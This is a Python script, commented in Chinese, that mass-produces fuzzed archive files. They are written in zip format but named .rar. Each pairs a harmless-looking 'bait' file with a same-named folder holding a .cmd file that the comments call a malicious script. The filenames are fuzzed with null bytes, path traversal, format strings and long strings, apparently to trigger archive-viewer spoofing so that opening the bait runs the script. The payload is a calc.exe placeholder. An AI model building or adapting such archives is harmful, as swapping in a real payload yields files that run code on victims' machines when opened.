import zipfile
import random
import os
import shutil

# --- setting ---
OUTPUT_DIR = "fuzz_output_massive"  
NUM_TEST_CASES = 100                # 這邊改要產出多少個 zip file
BAIT_CONTENT = b"This is a harmless picture... or is it?" 
SCRIPT_CONTENT = b"calc.exe"        # 惡意腳本
BASE_FILENAME = "test"              

# --- Fuzzing map ---
FUZZ_VECTORS = [
    b" ", b"\t", b"\x00",           # 空白與 Null
    b"\r", b"\n",                   # 換行
    b"/", b"\\",                    # 路徑分隔符
    b"*", b"?", b"<", b">", b"|",   # 檔案系統保留字
    b"\xff", b"\xfe", b"\x8b",      # 非 ASCII (容易導致編碼錯誤的字元)
    b"%s", b"%n",                   # Format String
    b"A" * 256,                     # Buffer Overflow
    b"../" * 5,                     # Path Traversal
]

def get_random_garbage(length=5):
    return bytes([random.randint(0, 255) for _ in range(length)])

# 生成變異後綴
def generate_fuzz_name():
    
    strategy = random.choice(["random_bytes", "vector_injection", "mixed"])
    suffix = b""
    if strategy == "random_bytes":
        suffix = get_random_garbage(random.randint(1, 10))
    elif strategy == "vector_injection":
        suffix = random.choice(FUZZ_VECTORS)
    elif strategy == "mixed":
        suffix = random.choice(FUZZ_VECTORS) + get_random_garbage(3)
    return suffix

# 產生亂碼後綴
def create_fuzzed_archive(index):
    bad_suffix = generate_fuzz_name()
    # 組合出變異的檔名 (bytes 格式)
    fuzzed_name_bytes = BASE_FILENAME.encode('ascii') + bad_suffix
    # 將 0-255 的字節無損映射為 Unicode 字符，不會 Crash。
    fuzzed_name_str = fuzzed_name_bytes.decode('latin-1') 
    safe_name = f"case_{index:04d}"
    zip_path = os.path.join(OUTPUT_DIR, f"{safe_name}.rar")

    try:
        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_STORED) as zf:
            # 1. 寫入誘餌檔案 (使用變異檔名)
            info_bait = zipfile.ZipInfo(fuzzed_name_str)
            zf.writestr(info_bait, BAIT_CONTENT)
            
            # 2. 寫入惡意腳本 (在同名資料夾內)
            # 結構: fuzzed_name + "/" + fuzzed_name + ".cmd"
            script_name_bytes = fuzzed_name_bytes + b"/" + fuzzed_name_bytes + b".cmd"
            script_name_str = script_name_bytes.decode('latin-1')
            info_script = zipfile.ZipInfo(script_name_str)
            zf.writestr(info_script, SCRIPT_CONTENT)
            
    except Exception as e:
        print(f"[-] Error creating case {index}: {e}")

def main():
    if os.path.exists(OUTPUT_DIR):
        shutil.rmtree(OUTPUT_DIR)
    os.makedirs(OUTPUT_DIR)
    
    print(f"[*] Starting Massive Fuzzing: {NUM_TEST_CASES} cases...")
    
    for i in range(1, NUM_TEST_CASES + 1):
        create_fuzzed_archive(i)
        if i % 10 == 0:
            print(f"    Generated {i} cases...", end="\r")
    print(f"\n[+]Files saved in '{OUTPUT_DIR}'")

if __name__ == "__main__":
    main()